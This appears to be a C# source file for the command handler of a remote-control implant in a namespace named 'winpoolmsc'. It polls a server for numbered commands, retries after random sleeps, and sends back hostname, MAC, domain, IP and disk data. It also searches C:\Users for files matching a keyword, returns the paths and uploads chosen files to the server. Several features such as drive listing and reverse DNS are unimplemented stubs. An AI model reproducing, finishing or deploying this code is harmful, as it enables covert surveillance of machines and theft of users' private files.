using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;


namespace winpoolmsc
{
    internal static class CommandHandler
    {
        static List<HitFile> lastFiles;
        static NetHandler neth;
        static async public void sendCommand()
        {
            if (neth != null)
            {
                string response = await neth.AskCommand();

                while (response == "")
                {
                    Console.WriteLine("Unable to contact server");
                    Random rnd = new Random();
                    Thread.Sleep(rnd.Next(50000)+10000);
                    response = await neth.AskCommand(); 
                } 
                    
                Console.WriteLine(response);
                handlerCommand(response);
            }
        } 

        static async internal void handlerCommand(string request) 
        {
            //TODO: Choisir le bon split
            string[] requestParts = request.Split("&");
            int comNb = Int32.Parse(requestParts[0].Split("=")[1]);
            string arg = "";
            if (requestParts.Length >= 2)
            {
                arg = requestParts[1];
                arg = arg.Trim().Remove(arg.Length - 1);
            }
            switch (comNb)
            {
                case -1:
                    Environment.Exit(0);
                    break;

                case 0:
                    CheckDriverStatus();
                    break;
                case 1:
                    ComputerInfos ci = GetComputerInfos();
                    string responseString = $"{{\"content\":{{\"hostname\":\"{ci.Hostname}\",\"macaddress\":\"{ci.Macaddress}\", \"domain\":\"{ci.Domain}\",\"ipaddress\":\"{ci.IPaddress}\",\"fullsize\":\"{ci.FullSize}\",\"usedspace\":\"{ci.UsedSpace}\"}}}}";
                    Console.WriteLine(responseString);
                    await neth.SendCommandResult(1, responseString, null);
                    break;
                case 2:
                    string filter = arg.Split("=")[1];
                    var files = FindFilesWithFilter(filter);
                    string result = "";
                    foreach(HitFile file in files)
                    {
                        result += $"\"{file.Path}\",";
                    }
                    if (result.Length > 1)
                        result = result.Substring(0, result.Length - 1);
                    result = result.Replace("\\", "\\\\");
                    string postRequest = $"{{\"keyword\":\"{filter}\",\"content\":{result}}}";
                    Console.WriteLine(postRequest);
                    string response = await neth.SendCommandResult(2, $"{{\"keyword\":\"{filter}\",\"content\":[{result}]}}", null);
                    //string response = await neth.SendCommandResult(2, $"content=keyword", null);

                    //GetConnectedUsers();
                    break;
                case 3:
                    string filename = arg.Split("=")[1];
                    string req = $"{{\"filename\":\"{filename}\",\"content\":\"fichier\"}}";
                    //string req = $"{{\"filename\":\"{filename}\"}}";
                    Console.WriteLine(req);
                    try
                    {
                        await neth.SendCommandResult(3, req, filename);
                    }
                    catch (Exception e) { }
                    

                    
                    break;
                case 4:
                    ReverseDNSRequest();
                    break;
                case 5:
                    //TODO: Choisir le bon int
                    UploadFile(requestParts[5]);
                    break;
                case 6:
                    ListDrives();
                    break;
                case 7:
                    ListNetworkDrives();
                    break;
                default:
                    break;
            }
        }

        private static ComputerInfos GetComputerInfos()
        {
            E_DriverStatus comStatus = E_DriverStatus.DRIVER_UNKNOWN;
            string comName = Environment.MachineName;
#pragma warning disable CS8600 // Conversion de littéral ayant une valeur null ou d'une éventuelle valeur null en type non-nullable.
            string firstMacAddress = NetworkInterface.GetAllNetworkInterfaces()
                                                     .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                                                     .Select(nic => nic.GetPhysicalAddress().ToString())
                                                     .FirstOrDefault();
#pragma warning restore CS8600 // Conversion de littéral ayant une valeur null ou d'une éventuelle valeur null en type non-nullable.

            string domain = IPGlobalProperties.GetIPGlobalProperties().DomainName;
            IPAddress ipaddress = Dns.GetHostEntry(Dns.GetHostName()).AddressList.First();
            long full = DriveInfo.GetDrives().FirstOrDefault().TotalSize;
            long used = full - DriveInfo.GetDrives().FirstOrDefault().AvailableFreeSpace;

            return new ComputerInfos(comName, firstMacAddress, domain, ipaddress, full, used);
        }

        private static List<HitFile> FindFilesWithFilter(string filter)
        {
            try
            {
                string entrypoint = Path.GetFullPath("C:\\Users\\");
                List<HitFile> files = FileHandler.CrawlFiles(filter, entrypoint);
                Console.WriteLine("{0} files found with filter {1}", files.Count, filter);
                lastFiles = files;
                return files;
            } catch(Exception ex)
            {
                Console.WriteLine("Error While finding files with filter {0}", filter);
                return new List<HitFile>();
            }   
        }

        private static void ListNetworkDrives()
        {
            throw new NotImplementedException();
        }

        private static void ListDrives()
        {
            throw new NotImplementedException();
        }

        private static void UploadFile(string path)
        {
            throw new NotImplementedException();
        }

        private static void ReverseDNSRequest()
        {
            throw new NotImplementedException();
        }

        private static void Crawl()
        {
            throw new NotImplementedException();
        }

        private static void GetConnectedUsers()
        {
            throw new NotImplementedException();
        }

        static public void Instantiate(Server srv) 
        {
            neth = new NetHandler(srv);
            lastFiles = new List<HitFile>();
        }

        //TODO: make it private once tested 
        static public E_DriverStatus CheckDriverStatus()
        {
            DriverHandler.GetDriverStatus();

            return E_DriverStatus.DRIVER_UNKNOWN;
        }

        static private void Ping()
        {
            neth.Ping();
        }
    }
}
